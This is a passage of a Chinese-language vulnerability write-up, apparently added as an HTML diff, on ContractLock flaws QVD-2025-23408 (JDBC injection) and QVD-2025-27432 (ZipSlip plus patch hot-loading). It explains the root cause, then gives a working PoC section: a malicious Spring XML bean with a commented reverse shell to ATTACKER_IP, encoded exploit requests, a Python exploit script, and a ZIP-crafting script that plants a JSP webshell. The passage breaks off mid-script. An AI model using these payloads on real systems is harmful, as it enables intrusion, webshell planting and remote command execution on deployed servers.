+<span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">((</span><span class="n">entry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">zis</span><span class="p">.</span><span class="na">getNextEntry</span><span class="p">())</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">outputPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">destDir</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">File</span><span class="p">.</span><span class="na">separator</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">entry</span><span class="p">.</span><span class="na">getName</span><span class="p">();</span>
+<span class="w">            </span><span class="c1">// entry.getName() 可能是 &quot;../../../webapps/root/shell.jsp&quot;</span>
+<span class="w">            </span><span class="c1">// 直接拼接导致路径穿越，文件被写到目标目录之外!</span>
+<span class="w">            </span><span class="n">Files</span><span class="p">.</span><span class="na">copy</span><span class="p">(</span><span class="n">zis</span><span class="p">,</span><span class="w"> </span><span class="n">Paths</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">outputPath</span><span class="p">));</span>
+<span class="w">            </span><span class="n">entries</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">entry</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">entries</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>5.3 ZipSlip原理图解</h3>
+<p>ZipSlip是一种经典的路径穿越漏洞。ZIP格式允许压缩包内的条目名称包含 <code>../</code> 路径遍历序列。当解压代码直接将条目名称拼接到目标目录时，攻击者可以将文件写到任意位置。</p>
+<div class="highlight"><pre><span></span><code><span class="err">正常</span><span class="n">OFD文件解压</span><span class="o">:</span><span class="w">                    </span><span class="err">恶意</span><span class="n">OFD</span><span class="o">(</span><span class="n">ZipSlip</span><span class="o">)</span><span class="err">解压</span><span class="o">:</span>
+<span class="err">┌──────────────────────┐</span><span class="w">          </span><span class="err">┌──────────────────────────────────┐</span>
+<span class="err">│</span><span class="w"> </span><span class="n">OFD压缩包内容</span><span class="o">:</span><span class="w">        </span><span class="err">│</span><span class="w">          </span><span class="err">│</span><span class="w"> </span><span class="err">恶意</span><span class="n">OFD压缩包内容</span><span class="o">:</span><span class="w">                </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">├──</span><span class="w"> </span><span class="n">Doc_0</span><span class="sr">/OFD.xml   │          │  ├── Doc_0/</span><span class="n">OFD</span><span class="o">.</span><span class="na">xml</span><span class="w"> </span><span class="o">(</span><span class="err">诱饵</span><span class="o">)</span><span class="w">         </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">├──</span><span class="w"> </span><span class="n">Doc_0</span><span class="sr">/Signs/... │          │  ├── ../../webapps/root/s</span><span class="n">hell</span><span class="o">.</span><span class="na">jsp</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">└──</span><span class="w"> </span><span class="o">...</span><span class="w">             </span><span class="err">│</span><span class="w">          </span><span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">   </span><span class="err">↑</span><span class="w"> </span><span class="err">路径穿越</span><span class="o">!</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">└──────────────────────┘</span><span class="w">          </span><span class="err">│</span><span class="w">  </span><span class="err">└──</span><span class="w"> </span><span class="o">../../</span><span class="n">patch</span><span class="o">/</span><span class="n">malicious</span><span class="o">.</span><span class="na">jar</span><span class="w">    </span><span class="err">│</span>
+<span class="w">         </span><span class="err">│</span><span class="w">                        </span><span class="err">└──────────────────────────────────┘</span>
+<span class="w">         </span><span class="err">▼</span><span class="w">                                   </span><span class="err">│</span>
+<span class="err">解压目标</span><span class="o">:</span><span class="w"> </span><span class="sr">/tmp/ofd_verify/</span><span class="w">                          </span><span class="err">▼</span>
+<span class="err">┌──────────────────────┐</span><span class="w">          </span><span class="err">解压目标</span><span class="o">:</span><span class="w"> </span><span class="sr">/tmp/ofd_verify/</span>
+<span class="err">│</span><span class="w"> </span><span class="sr">/tmp/ofd_verify/</span><span class="w">      </span><span class="err">│</span><span class="w">          </span><span class="err">但实际写入</span><span class="o">:</span>
+<span class="err">│</span><span class="w">   </span><span class="err">├──</span><span class="w"> </span><span class="n">Doc_0</span><span class="o">/</span><span class="n">OFD</span><span class="o">.</span><span class="na">xml</span><span class="w">   </span><span class="err">│</span><span class="w">          </span><span class="err">┌──────────────────────────────────┐</span>
+<span class="err">│</span><span class="w">   </span><span class="err">└──</span><span class="w"> </span><span class="o">...</span><span class="w">             </span><span class="err">│</span><span class="w">          </span><span class="err">│</span><span class="w"> </span><span class="sr">/app/webapps/root/s</span><span class="n">hell</span><span class="o">.</span><span class="na">jsp</span><span class="w">      </span><span class="err">│</span><span class="w"> </span><span class="err">←</span><span class="w"> </span><span class="err">逃逸</span><span class="o">!</span>
+<span class="err">└──────────────────────┘</span><span class="w">          </span><span class="err">│</span><span class="w">   </span><span class="o">(</span><span class="err">穿越到</span><span class="n">Web根目录</span><span class="err">，可访问的</span><span class="n">JSP</span><span class="o">)</span><span class="w">   </span><span class="err">│</span>
+<span class="w">                                  </span><span class="err">│</span><span class="w"> </span><span class="sr">/app/patch/</span><span class="n">malicious</span><span class="o">.</span><span class="na">jar</span><span class="w">          </span><span class="err">│</span><span class="w"> </span><span class="err">←</span><span class="w"> </span><span class="err">逃逸</span><span class="o">!</span>
+<span class="w">                                  </span><span class="err">│</span><span class="w">   </span><span class="o">(</span><span class="err">穿越到补丁目录，被热加载</span><span class="o">)</span><span class="w">        </span><span class="err">│</span>
+<span class="w">                                  </span><span class="err">└──────────────────────────────────┘</span>
+</code></pre></div>
+
+<h3>5.4 漏洞根因：检查顺序错误</h3>
+<p>漏洞的关键在于<strong>解压操作与有效性检查的顺序错误</strong>：</p>
+<div class="highlight"><pre><span></span><code><span class="err">漏洞代码执行顺序</span><span class="o">:</span>
+<span class="w">  </span><span class="n">Step</span><span class="w"> </span><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="n">unzip</span><span class="o">(</span><span class="n">fileBytes</span><span class="o">)</span><span class="w">         </span><span class="err">←</span><span class="w"> </span><span class="err">先解压，文件已写入磁盘</span>
+<span class="w">  </span><span class="n">Step</span><span class="w"> </span><span class="mi">2</span><span class="o">:</span><span class="w"> </span><span class="err">检查文件名</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s2">&quot;OFD&quot;</span><span class="o">)</span><span class="w">  </span><span class="err">←</span><span class="w"> </span><span class="err">后检查，但文件已落地</span>
+
+<span class="err">正确做法应为</span><span class="o">:</span>
+<span class="w">  </span><span class="n">Step</span><span class="w"> </span><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="err">遍历</span><span class="n">ZipEntry</span><span class="err">，检查每个</span><span class="n">entry</span><span class="o">.</span><span class="na">getName</span><span class="o">()</span><span class="err">是否包含</span><span class="s2">&quot;../&quot;</span>
+<span class="w">  </span><span class="n">Step</span><span class="w"> </span><span class="mi">2</span><span class="o">:</span><span class="w"> </span><span class="err">仅在确认无穿越后才执行解压写入</span>
+</code></pre></div>
+
+<p>即使 <code>isOfd()</code> 方法最终返回 <code>false</code>（因为恶意压缩包中只有穿越路径的文件，不包含合法的OFD标识文件），恶意文件也已经在Step 1的解压过程中被写入了磁盘。攻击者利用这一时序差，实现了"验证未通过但文件已落地"的效果。</p>
+<hr />
+<h2>6. 从ZipSlip到RCE：热加载补丁机制滥用</h2>
+<h3>6.1 补丁热加载机制</h3>
+<p>契约锁系统具备一套<strong>安全补丁热加载机制</strong>（PatchManager），允许在不重启服务的情况下动态加载补丁包（通常是JAR文件或类文件）。这一机制的设计初衷是为了快速修复安全问题，但讽刺的是，它本身成为了RCE的最后一环。</p>
+<div class="highlight"><pre><span></span><code>热加载补丁流程:
+┌─────────────────────────────────────────────────────────┐
+│  1. 补丁文件放入指定目录 (如 /app/patch/ 或热加载目录)     │
+│  2. PatchManager监听目录变化 (WatchService / 定时扫描)    │
+│  3. 检测到新补丁文件                                       │
+│  4. 加载补丁JAR到ClassLoader                              │
+│  5. 实例化补丁中的Bean / 替换已有类                         │
+│  6. 补丁生效                                               │
+└─────────────────────────────────────────────────────────┘
+</code></pre></div>
+
+<h3>6.2 攻击链组合</h3>
+<p>攻击者将ZipSlip路径穿越与热加载机制结合，形成完整的RCE链：</p>
+<div class="highlight"><pre><span></span><code>Step 1: 构造恶意OFD文件 (ZIP格式)
+        内含路径穿越条目: ../../patch/malicious.jar
+        (malicious.jar中包含恶意Spring Bean或恶意类)
+
+Step 2: 上传到PDFVerifier验证接口
+        POST /api/pdfverifier/verify (或类似接口)
+
+Step 3: ZipSlip触发
+        unzip()将malicious.jar写入 /app/patch/malicious.jar
+        (穿越出临时目录，到达补丁热加载目录)
+
+Step 4: 热加载触发
+        PatchManager检测到新文件
+        加载malicious.jar到ClassPath
+        实例化其中的恶意Bean
+
+Step 5: RCE达成
+        恶意Bean的构造函数或init-method执行任意命令
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="err">攻击链时序图</span><span class="o">:</span>
+
+<span class="err">攻击者</span><span class="w">               </span><span class="n">PDFVerifier</span><span class="w">          </span><span class="err">文件系统</span><span class="w">           </span><span class="n">PatchManager</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                      </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">上传恶意</span><span class="n">OFD</span><span class="w">           </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│─────────────────────</span><span class="o">&gt;</span><span class="err">│</span><span class="w">                   </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                      </span><span class="err">│</span><span class="w"> </span><span class="n">unzip</span><span class="o">()</span><span class="w">           </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                      </span><span class="err">│──────────────────</span><span class="o">&gt;</span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                      </span><span class="err">│</span><span class="w"> </span><span class="err">写入恶意</span><span class="n">JAR到</span><span class="w">     </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                      </span><span class="err">│</span><span class="w"> </span><span class="sr">/app/patch/</span><span class="w">       </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                      </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span><span class="w"> </span><span class="err">目录变化通知</span><span class="w">       </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                      </span><span class="err">│</span><span class="w">                   </span><span class="err">│──────────────────</span><span class="o">&gt;</span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                      </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span><span class="w"> </span><span class="err">加载</span><span class="n">JAR</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                      </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span><span class="w"> </span><span class="err">实例化</span><span class="n">Bean</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                      </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span><span class="w"> </span><span class="err">执行命令</span>
+<span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="o">&lt;</span><span class="err">───────</span><span class="w"> </span><span class="n">RCE</span><span class="w"> </span><span class="err">────────────────────────────────────────────────│</span>
+</code></pre></div>
+
+<h3>6.3 另一种RCE路径：覆盖已有类文件</h3>
+<p>除热加载补丁外，攻击者还可以通过ZipSlip覆盖Web应用目录中已有的JSP文件或类文件：</p>
+<div class="highlight"><pre><span></span><code>穿越路径: ../../webapps/ROOT/evil.jsp
+写入内容: JSP Webshell
+
+效果: 攻击者直接访问 /evil.jsp 即可执行Webshell命令
+</code></pre></div>
+
+<p>这种路径不依赖热加载机制，利用更为直接，但需要知道Web应用的部署路径。</p>
+<hr />
+<h2>7. 完整利用PoC</h2>
+<h3>7.1 QVD-2025-23408：JDBC注入RCE PoC</h3>
+<p><strong>步骤1：在攻击者VPS上准备恶意Spring XML文件</strong></p>
+<div class="highlight"><pre><span></span><code><span class="cm">&lt;!-- 1.xml — 恶意Spring Bean配置，放至攻击者VPS的Web目录 --&gt;</span>
+<span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span>
+<span class="nt">&lt;beans</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://www.springframework.org/schema/beans&quot;</span>
+<span class="w">       </span><span class="na">xmlns:xsi=</span><span class="s">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>
+<span class="w">       </span><span class="na">xmlns:p=</span><span class="s">&quot;http://www.springframework.org/schema/p&quot;</span>
+<span class="w">       </span><span class="na">xsi:schemaLocation=</span><span class="s">&quot;http://www.springframework.org/schema/beans</span>
+<span class="s">       http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span><span class="nt">&gt;</span>
+
+<span class="w">    </span><span class="cm">&lt;!-- 利用ProcessBuilder + init-method执行命令 --&gt;</span>
+<span class="w">    </span><span class="nt">&lt;bean</span><span class="w"> </span><span class="na">id=</span><span class="s">&quot;exec&quot;</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;java.lang.ProcessBuilder&quot;</span><span class="w"> </span><span class="na">init-method=</span><span class="s">&quot;start&quot;</span><span class="nt">&gt;</span>
+<span class="w">        </span><span class="nt">&lt;constructor-arg&gt;</span>
+<span class="w">            </span><span class="nt">&lt;list&gt;</span>
+<span class="w">                </span><span class="nt">&lt;value&gt;</span>cmd<span class="nt">&lt;/value&gt;</span>
+<span class="w">                </span><span class="nt">&lt;value&gt;</span>/c<span class="nt">&lt;/value&gt;</span>
+<span class="w">                </span><span class="nt">&lt;value&gt;</span>calc<span class="nt">&lt;/value&gt;</span>
+<span class="w">                </span><span class="cm">&lt;!-- Linux替换为: &lt;value&gt;bash&lt;/value&gt; &lt;value&gt;-c&lt;/value&gt; &lt;value&gt;bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1&lt;/value&gt; --&gt;</span>
+<span class="w">            </span><span class="nt">&lt;/list&gt;</span>
+<span class="w">        </span><span class="nt">&lt;/constructor-arg&gt;</span>
+<span class="w">    </span><span class="nt">&lt;/bean&gt;</span>
+<span class="nt">&lt;/beans&gt;</span>
+</code></pre></div>
+
+<p>攻击者在VPS上启动HTTP服务托管该XML文件：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 攻击者VPS上</span>
+python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8099</span>
+<span class="c1"># 此时 http://ATTACKER_IP:8099/1.xml 可访问</span>
+</code></pre></div>
+
+<p><strong>步骤2：发送JDBC注入请求（PostgreSQL）</strong></p>
+<div class="highlight"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/setup/dbtest?db=POSTGRESQL&amp;host=localhost&amp;port=5321&amp;username=root&amp;name=test%2F%3FsocketFactory%3Dorg%2Espringframework%2Econtext%2Esupport%2EClassPathXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2FATTACKER_IP%3A8099%2F1%2Exml</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">target.example.com</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">0</span>
+</code></pre></div>
+
+<p>URL解码后的 <code>name</code> 参数值为：</p>
+<div class="highlight"><pre><span></span><code><span class="n">test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=http://ATTACKER_IP:8099/1.xml</span>
+</code></pre></div>
+
+<p><strong>步骤3：MySQL数据库的利用Payload</strong></p>
+<div class="highlight"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/setup/dbtest?db=MYSQL&amp;host=localhost&amp;port=3306&amp;username=root&amp;name=test%2F%3FsocketFactory%3Dorg%2Espringframework%2Econtext%2Esupport%2EClassPathXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2FATTACKER_IP%3A8099%2F1%2Exml</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">target.example.com</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">0</span>
+</code></pre></div>
+
+<blockquote>
+<p>注意：是否存在 <code>/api/</code> 前缀路径需根据实际部署情况判断。若存在API网关前缀，Payload中的URL需添加 <code>/api/</code> 前缀。</p>
+</blockquote>
+<p><strong>自动化利用脚本（Python）：</strong></p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># contractlock_jdbc_rce.py — QVD-2025-23408 PoC</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">urllib.parse</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">exploit</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">listener_url</span><span class="p">,</span> <span class="n">db_type</span><span class="o">=</span><span class="s2">&quot;POSTGRESQL&quot;</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    target_url: 契约锁目标地址, 如 http://target.example.com</span>
+<span class="sd">    listener_url: 攻击者VPS托管的恶意XML地址, 如 http://1.2.3.4:8099/1.xml</span>
+<span class="sd">    db_type: POSTGRESQL 或 MYSQL</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="c1"># 构造注入的name参数</span>
+    <span class="n">injection</span> <span class="o">=</span> <span class="p">(</span>
+        <span class="sa">f</span><span class="s2">&quot;test?socketFactory=&quot;</span>
+        <span class="sa">f</span><span class="s2">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>
+        <span class="sa">f</span><span class="s2">&quot;&amp;socketFactoryArg=</span><span class="si">{</span><span class="n">listener_url</span><span class="si">}</span><span class="s2">&quot;</span>
+    <span class="p">)</span>
+    <span class="c1"># URL编码</span>
+    <span class="n">encoded_name</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">injection</span><span class="p">,</span> <span class="n">safe</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+
+    <span class="c1"># 尝试两种路径 (有/无 /api 前缀)</span>
+    <span class="n">paths</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;/setup/dbtest&quot;</span><span class="p">,</span> <span class="s2">&quot;/api/setup/dbtest&quot;</span><span class="p">]</span>
+
+    <span class="k">for</span> <span class="n">path</span> <span class="ow">in</span> <span class="n">paths</span><span class="p">:</span>
+        <span class="n">url</span> <span class="o">=</span> <span class="p">(</span>
+            <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">target_url</span><span class="si">}{</span><span class="n">path</span><span class="si">}</span><span class="s2">&quot;</span>
+            <span class="sa">f</span><span class="s2">&quot;?db=</span><span class="si">{</span><span class="n">db_type</span><span class="si">}</span><span class="s2">&quot;</span>
+            <span class="sa">f</span><span class="s2">&quot;&amp;host=localhost&quot;</span>
+            <span class="sa">f</span><span class="s2">&quot;&amp;port=</span><span class="si">{</span><span class="s1">&#39;5321&#39;</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">db_type</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">&#39;POSTGRESQL&#39;</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="s1">&#39;3306&#39;</span><span class="si">}</span><span class="s2">&quot;</span>
+            <span class="sa">f</span><span class="s2">&quot;&amp;username=root&quot;</span>
+            <span class="sa">f</span><span class="s2">&quot;&amp;name=</span><span class="si">{</span><span class="n">encoded_name</span><span class="si">}</span><span class="s2">&quot;</span>
+        <span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] 尝试: </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    状态码: </span><span class="si">{</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    响应: </span><span class="si">{</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">[:</span><span class="mi">200</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+                <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] 请求已发送，检查VPS是否收到XML加载请求&quot;</span><span class="p">)</span>
+                <span class="k">return</span> <span class="kc">True</span>
+        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    错误: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="kc">False</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="k">else</span> <span class="s2">&quot;http://target.example.com&quot;</span>
+    <span class="n">listener</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="k">else</span> <span class="s2">&quot;http://ATTACKER_IP:8099/1.xml&quot;</span>
+    <span class="n">exploit</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">listener</span><span class="p">)</span>
+</code></pre></div>
+
+<h3>7.2 QVD-2025-27432：ZipSlip RCE PoC</h3>
+<p><strong>步骤1：构造含路径穿越条目的恶意OFD(ZIP)文件</strong></p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># craft_zipslip_ofd.py — 构造ZipSlip恶意OFD文件</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">zipfile</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">io</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">create_malicious_ofd</span><span class="p">(</span><span class="n">output_path</span><span class="p">,</span> <span class="n">traversal_target</span><span class="p">,</span> <span class="n">payload_content</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    output_path: 输出的OFD文件路径</span>
+<span class="sd">    traversal_target: 穿越目标相对路径, 如 &quot;../../patch/malicious.jar&quot;</span>
+<span class="sd">    payload_content: 写入的恶意内容(bytes)</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">buf</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">()</span>
+    <span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZIP_DEFLATED</span><span class="p">)</span> <span class="k">as</span> <span class="n">zf</span><span class="p">:</span>
+        <span class="c1"># 1. 添加一个合法OFD标识文件，使isOfd检查通过(可选)</span>
+        <span class="n">zf</span><span class="o">.</span><span class="n">writestr</span><span class="p">(</span><span class="s2">&quot;Doc_0/OFD.xml&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;ofd:OFD xmlns:ofd=&quot;http://www.ofdspec.org/2016&quot;&gt;&lt;/ofd:OFD&gt;&#39;</span><span class="p">)</span>
+
+        <span class="c1"># 2. 关键: 添加路径穿越条目</span>
+        <span class="c1"># 使用../穿越到解压目录之外</span>
+        <span class="n">zf</span><span class="o">.</span><span class="n">writestr</span><span class="p">(</span><span class="n">traversal_target</span><span class="p">,</span> <span class="n">payload_content</span><span class="p">)</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_path</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">buf</span><span class="o">.</span><span class="n">getvalue</span><span class="p">())</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] 恶意OFD文件已生成: </span><span class="si">{</span><span class="n">output_path</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    穿越目标: </span><span class="si">{</span><span class="n">traversal_target</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="c1"># 示例1: 写入JSP Webshell</span>
+<span class="n">jsp_webshell</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&lt;%@ page import=&quot;java.io.*&quot; %&gt;&lt;% String cmd=request.getParameter(&quot;cmd&quot;); Process p=Runtime.getRuntime().exec(cmd); BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=br.readLine())!=null) out.println(l); %&gt;&#39;</span>
+<span class="n">create_malicious_ofd</span><span class="p">(</span><span class="s2">&quot;evil_ofd_webshell.ofd&quot;</span><span class="p">,</span>
+                     <span class="s2">&quot;../../webapps/ROOT/shell.jsp&quot;</span><span class="p">,</span>
+                     <span class="n">jsp_webshell</span><span class="p">)</span>
+
+<span class="c1"># 示例2: 写入恶意补丁JAR (需预先打包)</span>
+<span class="c1"># create_malicious_ofd(&quot;evil_ofd_patch.ofd&quot;,</span>
+<span class="c1">#                      &quot;../../patch/evil.jar&quot;,</span>
+<span class="c1">#                      malicious_jar_bytes)</span>
+</code></pre></div>
+
+<p><strong>步骤2：上传恶意OFD文件到验证接口</strong></p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># contractlock_zipslip_rce.py — QVD-2025-27432 PoC</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">upload_malicious_ofd</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">ofd_file_path</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    上传恶意OFD文件触发ZipSlip</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="c1"># PDFVerifier验证接口 (具体路径需根据实际版本确认)</span>
+    <span class="n">verify_paths</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="s2">&quot;/api/pdfverifier/verify&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;/pdfverifier/verify&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;/api/file/verify&quot;</span><span class="p">,</span>
+    <span class="p">]</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">ofd_file_path</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">file_data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+
+    <span class="k">for</span> <span class="n">path</span> <span class="ow">in</span> <span class="n">verify_paths</span><span class="p">:</span>
+        <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">target_url</span><span class="si">}{</span><span class="n">path</span><span class="si">}</span><span class="s2">&quot;</span>
